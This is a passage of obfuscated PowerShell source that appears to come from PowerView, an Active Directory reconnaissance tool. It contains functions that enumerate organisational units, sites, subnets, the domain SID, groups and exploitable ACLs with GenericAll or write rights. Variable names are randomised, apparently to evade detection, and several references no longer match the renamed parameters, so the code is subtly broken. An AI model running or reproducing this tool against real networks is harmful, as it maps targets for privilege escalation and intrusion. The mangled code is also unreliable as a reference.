        if ($PSBoundParameters['Credential']) { $iA8aCAaRdB['Credential'] = $3ezVSfm6f4k }

        
        $4lBbqAmZDUtECG7FhO = @{}
    }

    PROCESS {
        if ($PSBoundParameters['Domain']) {
            $UcDG['Domain'] = $3Ecdwi8qNy
            $iA8aCAaRdB['Domain'] = $3Ecdwi8qNy
        }

        Get-DomainObjectAcl @ACLArguments | ForEach-Object {

            if ( ($_.ActiveDirectoryRights -match 'GenericAll|Write|Create|Delete') -or (($_.ActiveDirectoryRights -match 'ExtendedRight') -and ($_.AceQualifier -match 'Allow'))) {
                
                if ($_.SecurityIdentifier.Value -match '^S-1-5-.*-[1-9]\d{3,}$') {
                    if ($4lBbqAmZDUtECG7FhO[$_.SecurityIdentifier.Value]) {
                        $cc6uf2J5CMID2kkGKN0sbW58k, $qr4SoePuNn, $xr8ZSkzHcMLDwoh, $ZR7DqLWCenNU0js = $4lBbqAmZDUtECG7FhO[$_.SecurityIdentifier.Value]

                        $vOjHN13FzlXMghm42kqDot = New-Object PSObject
                        $vOjHN13FzlXMghm42kqDot | Add-Member NoteProperty 'ObjectDN' $_.ObjectDN
                        $vOjHN13FzlXMghm42kqDot | Add-Member NoteProperty 'AceQualifier' $_.AceQualifier
                        $vOjHN13FzlXMghm42kqDot | Add-Member NoteProperty 'ActiveDirectoryRights' $_.ActiveDirectoryRights
                        if ($_.ObjectAceType) {
                            $vOjHN13FzlXMghm42kqDot | Add-Member NoteProperty 'ObjectAceType' $_.ObjectAceType
                        }
                        else {
                            $vOjHN13FzlXMghm42kqDot | Add-Member NoteProperty 'ObjectAceType' 'None'
                        }
                        $vOjHN13FzlXMghm42kqDot | Add-Member NoteProperty 'AceFlags' $_.AceFlags
                        $vOjHN13FzlXMghm42kqDot | Add-Member NoteProperty 'AceType' $_.AceType
                        $vOjHN13FzlXMghm42kqDot | Add-Member NoteProperty 'InheritanceFlags' $_.InheritanceFlags
                        $vOjHN13FzlXMghm42kqDot | Add-Member NoteProperty 'SecurityIdentifier' $_.SecurityIdentifier
                        $vOjHN13FzlXMghm42kqDot | Add-Member NoteProperty 'IdentityReferenceName' $cc6uf2J5CMID2kkGKN0sbW58k
                        $vOjHN13FzlXMghm42kqDot | Add-Member NoteProperty 'IdentityReferenceDomain' $qr4SoePuNn
                        $vOjHN13FzlXMghm42kqDot | Add-Member NoteProperty 'IdentityReferenceDN' $xr8ZSkzHcMLDwoh
                        $vOjHN13FzlXMghm42kqDot | Add-Member NoteProperty 'IdentityReferenceClass' $ZR7DqLWCenNU0js
                        $vOjHN13FzlXMghm42kqDot
                    }
                    else {
                        $xr8ZSkzHcMLDwoh = Convert-ADName -S $_.SecurityIdentifier.Value -YSu8jzco2Jt DN @ADNameArguments
                        

                        if ($xr8ZSkzHcMLDwoh) {
                            $qr4SoePuNn = $xr8ZSkzHcMLDwoh.SubString($xr8ZSkzHcMLDwoh.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                            
                            $5cU['Domain'] = $qr4SoePuNn
                            $5cU['Identity'] = $xr8ZSkzHcMLDwoh
                            
                            $jp9jiurTsXvElqD = Get-DomainObject @ObjectSearcherArguments

                            if ($jp9jiurTsXvElqD) {
                                $cc6uf2J5CMID2kkGKN0sbW58k = $jp9jiurTsXvElqD.Properties.samaccountname[0]
                                if ($jp9jiurTsXvElqD.Properties.objectclass -match 'computer') {
                                    $ZR7DqLWCenNU0js = 'computer'
                                }
                                elseif ($jp9jiurTsXvElqD.Properties.objectclass -match 'group') {
                                    $ZR7DqLWCenNU0js = 'group'
                                }
                                elseif ($jp9jiurTsXvElqD.Properties.objectclass -match 'user') {
                                    $ZR7DqLWCenNU0js = 'user'
                                }
                                else {
                                    $ZR7DqLWCenNU0js = $qYFR5PCZruUkdna9T
                                }

                                
                                $4lBbqAmZDUtECG7FhO[$_.SecurityIdentifier.Value] = $cc6uf2J5CMID2kkGKN0sbW58k, $qr4SoePuNn, $xr8ZSkzHcMLDwoh, $ZR7DqLWCenNU0js

                                $vOjHN13FzlXMghm42kqDot = New-Object PSObject
                                $vOjHN13FzlXMghm42kqDot | Add-Member NoteProperty 'ObjectDN' $_.ObjectDN
                                $vOjHN13FzlXMghm42kqDot | Add-Member NoteProperty 'AceQualifier' $_.AceQualifier
                                $vOjHN13FzlXMghm42kqDot | Add-Member NoteProperty 'ActiveDirectoryRights' $_.ActiveDirectoryRights
                                if ($_.ObjectAceType) {
                                    $vOjHN13FzlXMghm42kqDot | Add-Member NoteProperty 'ObjectAceType' $_.ObjectAceType
                                }
                                else {
                                    $vOjHN13FzlXMghm42kqDot | Add-Member NoteProperty 'ObjectAceType' 'None'
                                }
                                $vOjHN13FzlXMghm42kqDot | Add-Member NoteProperty 'AceFlags' $_.AceFlags
                                $vOjHN13FzlXMghm42kqDot | Add-Member NoteProperty 'AceType' $_.AceType
                                $vOjHN13FzlXMghm42kqDot | Add-Member NoteProperty 'InheritanceFlags' $_.InheritanceFlags
                                $vOjHN13FzlXMghm42kqDot | Add-Member NoteProperty 'SecurityIdentifier' $_.SecurityIdentifier
                                $vOjHN13FzlXMghm42kqDot | Add-Member NoteProperty 'IdentityReferenceName' $cc6uf2J5CMID2kkGKN0sbW58k
                                $vOjHN13FzlXMghm42kqDot | Add-Member NoteProperty 'IdentityReferenceDomain' $qr4SoePuNn
                                $vOjHN13FzlXMghm42kqDot | Add-Member NoteProperty 'IdentityReferenceDN' $xr8ZSkzHcMLDwoh
                                $vOjHN13FzlXMghm42kqDot | Add-Member NoteProperty 'IdentityReferenceClass' $ZR7DqLWCenNU0js
                                $vOjHN13FzlXMghm42kqDot
                            }
                        }
                        else {
                            Write-Warning "[Find-InterestingDomainAcl] Unable to convert SID '$($_.SecurityIdentifier.Value )' to a distinguishedname with Convert-ADName"
                        }
                    }
                }
            }
        }
    }
}


function Get-DomainOU {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.OU')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [String[]]
        $S,

        [ValidateNotNullOrEmpty()]
        [String]
        [Alias('GUID')]
        $qXx94,

        [ValidateNotNullOrEmpty()]
        [String]
        $3Ecdwi8qNy,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $c7rZO2V9,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $UtHQ,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $h2yNsAt,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Gkd0Hz5f,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $9xBkgsU80TdhW6XNGqtnDA7 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $dTP7Qv6RslNUx = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $OVoMgsOXRJJ7,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $Z8qdyPlzVkp4RigJ71,

        [Switch]
        $jVcDk0Ocw0TgdcVV8Sq,

        [Alias('ReturnOne')]
        [Switch]
        $Lnzs4NIWklS,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $3ezVSfm6f4k = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $VcZPt
    )

    BEGIN {
        $wtWPex5R = @{}
        if ($PSBoundParameters['Domain']) { $wtWPex5R['Domain'] = $3Ecdwi8qNy }
        if ($PSBoundParameters['Properties']) { $wtWPex5R['Properties'] = $UtHQ }
        if ($PSBoundParameters['SearchBase']) { $wtWPex5R['SearchBase'] = $h2yNsAt }
        if ($PSBoundParameters['Server']) { $wtWPex5R['Server'] = $Gkd0Hz5f }
        if ($PSBoundParameters['SearchScope']) { $wtWPex5R['SearchScope'] = $9xBkgsU80TdhW6XNGqtnDA7 }
        if ($PSBoundParameters['ResultPageSize']) { $wtWPex5R['ResultPageSize'] = $dTP7Qv6RslNUx }
        if ($PSBoundParameters['ServerTimeLimit']) { $wtWPex5R['ServerTimeLimit'] = $OVoMgsOXRJJ7 }
        if ($PSBoundParameters['SecurityMasks']) { $wtWPex5R['SecurityMasks'] = $Z8qdyPlzVkp4RigJ71 }
        if ($PSBoundParameters['Tombstone']) { $wtWPex5R['Tombstone'] = $jVcDk0Ocw0TgdcVV8Sq }
        if ($PSBoundParameters['Credential']) { $wtWPex5R['Credential'] = $3ezVSfm6f4k }
        $PobKnJBghxqw = Get-DomainSearcher @SearcherArguments
    }

    PROCESS {
        if ($PobKnJBghxqw) {
            $CO2KFH = ''
            $Iq7bLVAvhKnpjdMlH2 = ''
            $S | Where-Object {$_} | ForEach-Object {
                $It59GzvwEj = $_.Replace('(', '\28').Replace(')', '\29')
                if ($It59GzvwEj -match '^OU=.*') {
                    $CO2KFH += "(distinguishedname=$It59GzvwEj)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        
                        
                        $23DM = $It59GzvwEj.SubString($It59GzvwEj.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[Get-DomainOU] Extracted domain '$23DM' from '$It59GzvwEj'"
                        $wtWPex5R['Domain'] = $23DM
                        $PobKnJBghxqw = Get-DomainSearcher @SearcherArguments
                        if (-not $PobKnJBghxqw) {
                            Write-Warning "[Get-DomainOU] Unable to retrieve domain searcher for '$23DM'"
                        }
                    }
                }
                else {
                    try {
                        $ypHo7v = (-Join (([Guid]$It59GzvwEj).ToByteArray() | ForEach-Object {$_.ToString('X').PadLeft(2,'0')})) -Replace '(..)','\$6uq'
                        $CO2KFH += "(objectguid=$ypHo7v)"
                    }
                    catch {
                        $CO2KFH += "(name=$It59GzvwEj)"
                    }
                }
            }
            if ($CO2KFH -and ($CO2KFH.Trim() -ne '') ) {
                $Iq7bLVAvhKnpjdMlH2 += "(|$CO2KFH)"
            }

            if ($PSBoundParameters['GPLink']) {
                Write-Verbose "[Get-DomainOU] Searching for OUs with $qXx94 set in the gpLink property"
                $Iq7bLVAvhKnpjdMlH2 += "(gplink=*$qXx94*)"
            }

            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[Get-DomainOU] Using additional LDAP filter: $c7rZO2V9"
                $Iq7bLVAvhKnpjdMlH2 += "$c7rZO2V9"
            }

            $PobKnJBghxqw.filter = "(&(objectCategory=organizationalUnit)$Iq7bLVAvhKnpjdMlH2)"
            Write-Verbose "[Get-DomainOU] Get-DomainOU filter string: $($PobKnJBghxqw.filter)"

            if ($PSBoundParameters['FindOne']) { $nhxRs5G1 = $PobKnJBghxqw.FindOne() }
            else { $nhxRs5G1 = $PobKnJBghxqw.FindAll() }
            $nhxRs5G1 | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters['Raw']) {
                    
                    $nJwk = $_
                }
                else {
                    $nJwk = Convert-LDAPProperty -UtHQ $_.Properties
                }
                $nJwk.PSObject.TypeNames.Insert(0, 'PowerView.OU')
                $nJwk
            }
            if ($nhxRs5G1) {
                try { $nhxRs5G1.dispose() }
                catch {
                    Write-Verbose "[Get-DomainOU] Error disposing of the Results object: $_"
                }
            }
            $PobKnJBghxqw.dispose()
        }
    }
}


function Get-DomainSite {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.Site')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [String[]]
        $S,

        [ValidateNotNullOrEmpty()]
        [String]
        [Alias('GUID')]
        $qXx94,

        [ValidateNotNullOrEmpty()]
        [String]
        $3Ecdwi8qNy,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $c7rZO2V9,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $UtHQ,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $h2yNsAt,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Gkd0Hz5f,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $9xBkgsU80TdhW6XNGqtnDA7 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $dTP7Qv6RslNUx = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $OVoMgsOXRJJ7,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $Z8qdyPlzVkp4RigJ71,

        [Switch]
        $jVcDk0Ocw0TgdcVV8Sq,

        [Alias('ReturnOne')]
        [Switch]
        $Lnzs4NIWklS,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $3ezVSfm6f4k = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $VcZPt
    )

    BEGIN {
        $wtWPex5R = @{
            'SearchBasePrefix' = 'CN=Sites,CN=Configuration'
        }
        if ($PSBoundParameters['Domain']) { $wtWPex5R['Domain'] = $3Ecdwi8qNy }
        if ($PSBoundParameters['Properties']) { $wtWPex5R['Properties'] = $UtHQ }
        if ($PSBoundParameters['SearchBase']) { $wtWPex5R['SearchBase'] = $h2yNsAt }
        if ($PSBoundParameters['Server']) { $wtWPex5R['Server'] = $Gkd0Hz5f }
        if ($PSBoundParameters['SearchScope']) { $wtWPex5R['SearchScope'] = $9xBkgsU80TdhW6XNGqtnDA7 }
        if ($PSBoundParameters['ResultPageSize']) { $wtWPex5R['ResultPageSize'] = $dTP7Qv6RslNUx }
        if ($PSBoundParameters['ServerTimeLimit']) { $wtWPex5R['ServerTimeLimit'] = $OVoMgsOXRJJ7 }
        if ($PSBoundParameters['SecurityMasks']) { $wtWPex5R['SecurityMasks'] = $Z8qdyPlzVkp4RigJ71 }
        if ($PSBoundParameters['Tombstone']) { $wtWPex5R['Tombstone'] = $jVcDk0Ocw0TgdcVV8Sq }
        if ($PSBoundParameters['Credential']) { $wtWPex5R['Credential'] = $3ezVSfm6f4k }
        $K5b4jAu5PsTvw = Get-DomainSearcher @SearcherArguments
    }

    PROCESS {
        if ($K5b4jAu5PsTvw) {
            $CO2KFH = ''
            $Iq7bLVAvhKnpjdMlH2 = ''
            $S | Where-Object {$_} | ForEach-Object {
                $It59GzvwEj = $_.Replace('(', '\28').Replace(')', '\29')
                if ($It59GzvwEj -match '^CN=.*') {
                    $CO2KFH += "(distinguishedname=$It59GzvwEj)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        
                        
                        $23DM = $It59GzvwEj.SubString($It59GzvwEj.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[Get-DomainSite] Extracted domain '$23DM' from '$It59GzvwEj'"
                        $wtWPex5R['Domain'] = $23DM
                        $K5b4jAu5PsTvw = Get-DomainSearcher @SearcherArguments
                        if (-not $K5b4jAu5PsTvw) {
                            Write-Warning "[Get-DomainSite] Unable to retrieve domain searcher for '$23DM'"
                        }
                    }
                }
                else {
                    try {
                        $ypHo7v = (-Join (([Guid]$It59GzvwEj).ToByteArray() | ForEach-Object {$_.ToString('X').PadLeft(2,'0')})) -Replace '(..)','\$6uq'
                        $CO2KFH += "(objectguid=$ypHo7v)"
                    }
                    catch {
                        $CO2KFH += "(name=$It59GzvwEj)"
                    }
                }
            }
            if ($CO2KFH -and ($CO2KFH.Trim() -ne '') ) {
                $Iq7bLVAvhKnpjdMlH2 += "(|$CO2KFH)"
            }

            if ($PSBoundParameters['GPLink']) {
                Write-Verbose "[Get-DomainSite] Searching for sites with $qXx94 set in the gpLink property"
                $Iq7bLVAvhKnpjdMlH2 += "(gplink=*$qXx94*)"
            }

            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[Get-DomainSite] Using additional LDAP filter: $c7rZO2V9"
                $Iq7bLVAvhKnpjdMlH2 += "$c7rZO2V9"
            }

            $K5b4jAu5PsTvw.filter = "(&(objectCategory=site)$Iq7bLVAvhKnpjdMlH2)"
            Write-Verbose "[Get-DomainSite] Get-DomainSite filter string: $($K5b4jAu5PsTvw.filter)"

            if ($PSBoundParameters['FindOne']) { $nhxRs5G1 = $K5b4jAu5PsTvw.FindAll() }
            else { $nhxRs5G1 = $K5b4jAu5PsTvw.FindAll() }
            $nhxRs5G1 | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters['Raw']) {
                    
                    $R5 = $_
                }
                else {
                    $R5 = Convert-LDAPProperty -UtHQ $_.Properties
                }
                $R5.PSObject.TypeNames.Insert(0, 'PowerView.Site')
                $R5
            }
            if ($nhxRs5G1) {
                try { $nhxRs5G1.dispose() }
                catch {
                    Write-Verbose "[Get-DomainSite] Error disposing of the Results object"
                }
            }
            $K5b4jAu5PsTvw.dispose()
        }
    }
}


function Get-DomainSubnet {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.Subnet')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [String[]]
        $S,

        [ValidateNotNullOrEmpty()]
        [String]
        $M6Sb30DA,

        [ValidateNotNullOrEmpty()]
        [String]
        $3Ecdwi8qNy,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $c7rZO2V9,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $UtHQ,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $h2yNsAt,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Gkd0Hz5f,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $9xBkgsU80TdhW6XNGqtnDA7 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $dTP7Qv6RslNUx = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $OVoMgsOXRJJ7,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $Z8qdyPlzVkp4RigJ71,

        [Switch]
        $jVcDk0Ocw0TgdcVV8Sq,

        [Alias('ReturnOne')]
        [Switch]
        $Lnzs4NIWklS,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $3ezVSfm6f4k = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $VcZPt
    )

    BEGIN {
        $wtWPex5R = @{
            'SearchBasePrefix' = 'CN=Subnets,CN=Sites,CN=Configuration'
        }
        if ($PSBoundParameters['Domain']) { $wtWPex5R['Domain'] = $3Ecdwi8qNy }
        if ($PSBoundParameters['Properties']) { $wtWPex5R['Properties'] = $UtHQ }
        if ($PSBoundParameters['SearchBase']) { $wtWPex5R['SearchBase'] = $h2yNsAt }
        if ($PSBoundParameters['Server']) { $wtWPex5R['Server'] = $Gkd0Hz5f }
        if ($PSBoundParameters['SearchScope']) { $wtWPex5R['SearchScope'] = $9xBkgsU80TdhW6XNGqtnDA7 }
        if ($PSBoundParameters['ResultPageSize']) { $wtWPex5R['ResultPageSize'] = $dTP7Qv6RslNUx }
        if ($PSBoundParameters['ServerTimeLimit']) { $wtWPex5R['ServerTimeLimit'] = $OVoMgsOXRJJ7 }
        if ($PSBoundParameters['SecurityMasks']) { $wtWPex5R['SecurityMasks'] = $Z8qdyPlzVkp4RigJ71 }
        if ($PSBoundParameters['Tombstone']) { $wtWPex5R['Tombstone'] = $jVcDk0Ocw0TgdcVV8Sq }
        if ($PSBoundParameters['Credential']) { $wtWPex5R['Credential'] = $3ezVSfm6f4k }
        $WYyxICmG81uRkB = Get-DomainSearcher @SearcherArguments
    }

    PROCESS {
        if ($WYyxICmG81uRkB) {
            $CO2KFH = ''
            $Iq7bLVAvhKnpjdMlH2 = ''
            $S | Where-Object {$_} | ForEach-Object {
                $It59GzvwEj = $_.Replace('(', '\28').Replace(')', '\29')
                if ($It59GzvwEj -match '^CN=.*') {
                    $CO2KFH += "(distinguishedname=$It59GzvwEj)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        
                        
                        $23DM = $It59GzvwEj.SubString($It59GzvwEj.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[Get-DomainSubnet] Extracted domain '$23DM' from '$It59GzvwEj'"
                        $wtWPex5R['Domain'] = $23DM
                        $WYyxICmG81uRkB = Get-DomainSearcher @SearcherArguments
                        if (-not $WYyxICmG81uRkB) {
                            Write-Warning "[Get-DomainSubnet] Unable to retrieve domain searcher for '$23DM'"
                        }
                    }
                }
                else {
                    try {
                        $ypHo7v = (-Join (([Guid]$It59GzvwEj).ToByteArray() | ForEach-Object {$_.ToString('X').PadLeft(2,'0')})) -Replace '(..)','\$6uq'
                        $CO2KFH += "(objectguid=$ypHo7v)"
                    }
                    catch {
                        $CO2KFH += "(name=$It59GzvwEj)"
                    }
                }
            }
            if ($CO2KFH -and ($CO2KFH.Trim() -ne '') ) {
                $Iq7bLVAvhKnpjdMlH2 += "(|$CO2KFH)"
            }

            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[Get-DomainSubnet] Using additional LDAP filter: $c7rZO2V9"
                $Iq7bLVAvhKnpjdMlH2 += "$c7rZO2V9"
            }

            $WYyxICmG81uRkB.filter = "(&(objectCategory=subnet)$Iq7bLVAvhKnpjdMlH2)"
            Write-Verbose "[Get-DomainSubnet] Get-DomainSubnet filter string: $($WYyxICmG81uRkB.filter)"

            if ($PSBoundParameters['FindOne']) { $nhxRs5G1 = $WYyxICmG81uRkB.FindOne() }
            else { $nhxRs5G1 = $WYyxICmG81uRkB.FindAll() }
            $nhxRs5G1 | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters['Raw']) {
                    
                    $Dm4nVsXlI8wb = $_
                }
                else {
                    $Dm4nVsXlI8wb = Convert-LDAPProperty -UtHQ $_.Properties
                }
                $Dm4nVsXlI8wb.PSObject.TypeNames.Insert(0, 'PowerView.Subnet')

                if ($PSBoundParameters['SiteName']) {
                    
                    
                    if ($Dm4nVsXlI8wb.properties -and ($Dm4nVsXlI8wb.properties.siteobject -like "*$M6Sb30DA*")) {
                        $Dm4nVsXlI8wb
                    }
                    elseif ($Dm4nVsXlI8wb.siteobject -like "*$M6Sb30DA*") {
                        $Dm4nVsXlI8wb
                    }
                }
                else {
                    $Dm4nVsXlI8wb
                }
            }
            if ($nhxRs5G1) {
                try { $nhxRs5G1.dispose() }
                catch {
                    Write-Verbose "[Get-DomainSubnet] Error disposing of the Results object: $_"
                }
            }
            $WYyxICmG81uRkB.dispose()
        }
    }
}


function Get-DomainSID {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [ValidateNotNullOrEmpty()]
        [String]
        $3Ecdwi8qNy,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Gkd0Hz5f,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $3ezVSfm6f4k = [Management.Automation.PSCredential]::Empty
    )

    $wtWPex5R = @{
        'LDAPFilter' = '(userAccountControl:1.2.840.113556.1.4.803:=8192)'
    }
    if ($PSBoundParameters['Domain']) { $wtWPex5R['Domain'] = $3Ecdwi8qNy }
    if ($PSBoundParameters['Server']) { $wtWPex5R['Server'] = $Gkd0Hz5f }
    if ($PSBoundParameters['Credential']) { $wtWPex5R['Credential'] = $3ezVSfm6f4k }

    $7yT7R = Get-DomainComputer @SearcherArguments -Lnzs4NIWklS | Select-Object -First 1 -ExpandProperty objectsid

    if ($7yT7R) {
        $7yT7R.SubString(0, $7yT7R.LastIndexOf('-'))
    }
    else {
        Write-Verbose "[Get-DomainSID] Error extracting domain SID for '$3Ecdwi8qNy'"
    }
}


function Get-DomainGroup {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.Group')]
    [CmdletBinding(DefaultParameterSetName = 'AllowDelegation')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $S,

        [ValidateNotNullOrEmpty()]
        [Alias('UserName')]
        [String]
        $1qlU47,

        [Switch]
        $Qry1ged2hMaqkv,

        [ValidateSet('DomainLocal', 'NotDomainLocal', 'Global', 'NotGlobal', 'Universal', 'NotUniversal')]
        [Alias('Scope')]
        [String]
        $RKqyMCT84,

        [ValidateSet('Security', 'Distribution', 'CreatedBySystem', 'NotCreatedBySystem')]
        [String]
        $mnJ2qAjebxUSTFHRythvrwg,

        [ValidateNotNullOrEmpty()]
        [String]
        $3Ecdwi8qNy,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $c7rZO2V9,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $UtHQ,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $h2yNsAt,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Gkd0Hz5f,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $9xBkgsU80TdhW6XNGqtnDA7 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $dTP7Qv6RslNUx = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $OVoMgsOXRJJ7,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $Z8qdyPlzVkp4RigJ71,

        [Switch]
        $jVcDk0Ocw0TgdcVV8Sq,

        [Alias('ReturnOne')]
        [Switch]
        $Lnzs4NIWklS,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $3ezVSfm6f4k = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $VcZPt
    )

    BEGIN {
        $wtWPex5R = @{}
        if ($PSBoundParameters['Domain']) { $wtWPex5R['Domain'] = $3Ecdwi8qNy }
        if ($PSBoundParameters['Properties']) { $wtWPex5R['Properties'] = $UtHQ }
        if ($PSBoundParameters['SearchBase']) { $wtWPex5R['SearchBase'] = $h2yNsAt }
        if ($PSBoundParameters['Server']) { $wtWPex5R['Server'] = $Gkd0Hz5f }
        if ($PSBoundParameters['SearchScope']) { $wtWPex5R['SearchScope'] = $9xBkgsU80TdhW6XNGqtnDA7 }
        if ($PSBoundParameters['ResultPageSize']) { $wtWPex5R['ResultPageSize'] = $dTP7Qv6RslNUx }
        if ($PSBoundParameters['ServerTimeLimit']) { $wtWPex5R['ServerTimeLimit'] = $OVoMgsOXRJJ7 }
        if ($PSBoundParameters['SecurityMasks']) { $wtWPex5R['SecurityMasks'] = $Z8qdyPlzVkp4RigJ71 }
        if ($PSBoundParameters['Tombstone']) { $wtWPex5R['Tombstone'] = $jVcDk0Ocw0TgdcVV8Sq }
        if ($PSBoundParameters['Credential']) { $wtWPex5R['Credential'] = $3ezVSfm6f4k }
        $7r6tb1T9EuCphkAL = Get-DomainSearcher @SearcherArguments
    }

    PROCESS {
        if ($7r6tb1T9EuCphkAL) {
            if ($PSBoundParameters['MemberIdentity']) {

                if ($wtWPex5R['Properties']) {
                    $YlQ2RDfeJkPHs7qjrMAuC = $wtWPex5R['Properties']
                }

                $wtWPex5R['Identity'] = $1qlU47
                $wtWPex5R['Raw'] = $True

                Get-DomainObject @SearcherArguments | ForEach-Object {
                    
                    $t3KuYWduXm3OwSxQHF = $_.GetDirectoryEntry()

                    
                    $t3KuYWduXm3OwSxQHF.RefreshCache('tokenGroups')

                    $t3KuYWduXm3OwSxQHF.TokenGroups | ForEach-Object {
                        
                        $7CdMBTA4hHs = (New-Object System.Security.Principal.SecurityIdentifier($_,0)).Value

                        
                        if ($7CdMBTA4hHs -notmatch '^S-1-5-32-.*') {
                            $wtWPex5R['Identity'] = $7CdMBTA4hHs
                            $wtWPex5R['Raw'] = $False
                            if ($YlQ2RDfeJkPHs7qjrMAuC) { $wtWPex5R['Properties'] = $YlQ2RDfeJkPHs7qjrMAuC }
                            $BOr2NcFYpLPWHjdn8TXZQ4 = Get-DomainObject @SearcherArguments
                            if ($BOr2NcFYpLPWHjdn8TXZQ4) {
                                $BOr2NcFYpLPWHjdn8TXZQ4.PSObject.TypeNames.Insert(0, 'PowerView.Group')
                                $BOr2NcFYpLPWHjdn8TXZQ4
                            }
                        }
                    }
                }
            }
            else {
                $CO2KFH = ''
                $Iq7bLVAvhKnpjdMlH2 = ''
                $S | Where-Object {$_} | ForEach-Object {
                    $It59GzvwEj = $_.Replace('(', '\28').Replace(')', '\29')
                    if ($It59GzvwEj -match '^S-1-') {
                        $CO2KFH += "(objectsid=$It59GzvwEj)"
                    }
                    elseif ($It59GzvwEj -match '^CN=') {
                        $CO2KFH += "(distinguishedname=$It59GzvwEj)"
                        if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                            
                            
                            $23DM = $It59GzvwEj.SubString($It59GzvwEj.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                            Write-Verbose "[Get-DomainGroup] Extracted domain '$23DM' from '$It59GzvwEj'"
                            $wtWPex5R['Domain'] = $23DM
                            $7r6tb1T9EuCphkAL = Get-DomainSearcher @SearcherArguments
                            if (-not $7r6tb1T9EuCphkAL) {
                                Write-Warning "[Get-DomainGroup] Unable to retrieve domain searcher for '$23DM'"
                            }
                        }
                    }
                    elseif ($It59GzvwEj -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
